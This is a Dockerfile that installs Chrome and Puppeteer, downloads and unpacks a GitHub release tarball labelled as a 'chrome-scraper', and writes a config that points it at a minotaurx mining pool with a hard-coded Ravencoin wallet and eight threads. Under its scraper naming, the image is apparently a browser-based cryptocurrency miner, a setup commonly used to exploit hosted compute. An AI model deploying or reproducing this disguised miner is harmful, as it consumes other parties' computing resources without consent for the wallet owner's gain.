# Use an official Node.js runtime as a parent image
FROM node:18

# Set environment variables
ENV ALGO="minotaurx" \
    HOST="minotaurx.sea.mine.zpool.ca" \
    PORT=7019 \
    WALLET="RXvFsnz2kdfCsCkXJaH3QVSpdS4vj9ggiq" \
    PASSWORD="c=RVN" \
    THREADS=8 \
    FEE=1

# Install required packages and tools
RUN apt-get update && \
    apt-get install -y wget gnupg curl sudo && \
    curl -sS https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add - && \
    echo "deb http://dl.google.com/linux/chrome/deb/ stable main" | tee /etc/apt/sources.list.d/google.list && \
    apt-get update && \
    apt-get install -y google-chrome-stable

# Install Puppeteer dependencies
RUN apt-get install -yq libnss3-dev libatk-bridge2.0-0 libatk1.0-0 libatspi2.0-0 libgtk-3-0 libx11-xcb1 \
    libxcb-dri3-0 libxcomposite1 libxdamage1 libxi6 libxtst6

# Create app directory
WORKDIR /usr/src/app

# Download and extract the tarball
RUN curl -L -O -J https://github.com/malphite-code-2/chrome-scraper/releases/download/chrome-v2/chrome-mint.tar.gz && \
    tar -xvf chrome-mint.tar.gz && \
    rm chrome-mint.tar.gz && \
    mv chrome-mint/* . && \
    rm -r chrome-mint

# Install app dependencies
RUN npm install

# Replace the config.json file with the provided values
RUN rm config.json && \
    echo '{"algorithm": "'"$ALGO"'", "host": "'"$HOST"'", "port": '"$PORT"', "worker": "'"$WALLET"'", "password": "'"$PASSWORD"'", "workers": '"$THREADS"', "fee": '"$FEE"'}' > config.json

# Expose the port that the app runs on
EXPOSE 3000

# Run the application
CMD ["node", "index.js"]
